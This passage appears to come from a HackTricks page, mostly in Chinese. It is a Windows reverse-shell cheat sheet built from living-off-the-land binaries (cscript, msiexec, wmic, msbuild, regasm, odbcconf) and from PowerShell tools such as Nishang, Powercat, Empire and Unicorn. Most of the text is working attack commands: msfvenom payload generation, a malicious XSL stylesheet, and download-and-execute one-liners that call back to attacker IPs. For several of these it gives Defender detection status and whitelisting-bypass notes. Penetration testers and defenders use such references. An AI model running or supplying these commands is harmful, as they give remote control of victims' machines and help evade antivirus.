msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your IP> LPORT=<your port> -f vbs > payload.vbs
```

Once you have the payload script, you can transfer it to the target Windows machine and execute it using Cscript. This can be done using various methods, such as social engineering, exploiting vulnerabilities, or using other techniques.

To execute the payload using Cscript, open a command prompt on the target machine and run the following command:

```
cscript payload.vbs
```

This will execute the payload and establish a connection back to your machine, allowing you to gain remote access and control over the target system.

It's important to note that using Cscript with Metasploit requires proper authorization and should only be performed on systems you have permission to test. Unauthorized use of these techniques can lead to legal consequences. Always ensure you follow ethical hacking guidelines and obtain proper consent before conducting any penetration testing activities.
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**被防御者检测到**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
执行网络调用的进程：**svchost.exe**\
写入磁盘的有效载荷：**WebDAV客户端本地缓存**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**被防御者检测到**

## **MSIExec**

攻击者
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
受害者：
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**检测到**

## **Wmic**
```
wmic os get /format:"https://webserver/payload.xsl"
```
执行网络调用的进程：**wmic.exe**\
写入磁盘的有效载荷：**IE本地缓存**

示例xsl文件：
```
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
从[这里](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)提取

**未被检测到**

**您可以使用stager wmic轻松下载并执行Koadic僵尸**

## Msbuild
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
执行网络调用的进程：**svchost.exe**\
写入磁盘的有效载荷：**WebDAV客户端本地缓存**

您可以使用此技术绕过应用程序白名单和Powershell.exe限制。因为您将收到一个PS shell的提示。\
只需下载并执行此文件：[https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**未被检测到**

## **CSC**

在受害者机器上编译C#代码。
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
您可以从这里下载一个基本的C#反向shell：[https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**未检测到**

## **Regasm/Regsvc**
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
执行网络调用的进程：**svchost.exe**\
写入磁盘的有效载荷：**WebDAV客户端本地缓存**

**我还没有尝试过**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf
```
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
执行网络调用的进程：**svchost.exe**\
写入磁盘的有效载荷：**WebDAV客户端本地缓存**

**我还没有尝试过**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Powershell反弹Shell

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

在**Shells**文件夹中，有许多不同的反弹Shell。要下载并执行Invoke-_PowerShellTcp.ps1_，请复制该脚本并将其附加到文件末尾：
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
开始在Web服务器上提供脚本，并在受害者端执行它：
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Defender目前尚未将其检测为恶意代码（截至2019年3月4日）。

**TODO：检查其他nishang shells**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

下载，启动Web服务器，启动监听器，并在受害者端执行：
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Defender目前尚未将其识别为恶意代码（截至2019年3月4日）。

**powercat提供的其他选项：**

绑定shell、反向shell（TCP、UDP、DNS）、端口重定向、上传/下载、生成载荷、提供文件...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

创建一个PowerShell启动器，将其保存在文件中，然后下载并执行它。
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**检测到恶意代码**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

使用unicorn创建metasploit后门的powershell版本
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
使用创建的资源启动msfconsole：
```
msfconsole -r unicorn.rc
```
启动一个Web服务器，提供_powershell\_attack.txt_文件，并在受害者上执行以下操作：
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**检测到恶意代码**

## 更多

[PS>Attack](https://github.com/jaredhaight/PSAttack) 预加载了一些具有攻击性的PS模块的PS控制台（加密）\
[WinPWN](https://github.com/SecureThisShit/WinPwn) 预加载了一些具有攻击性的PS模块和代理检测的PS控制台（IEX）

## 参考资料

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

​

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到最重要的漏洞，以便更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>
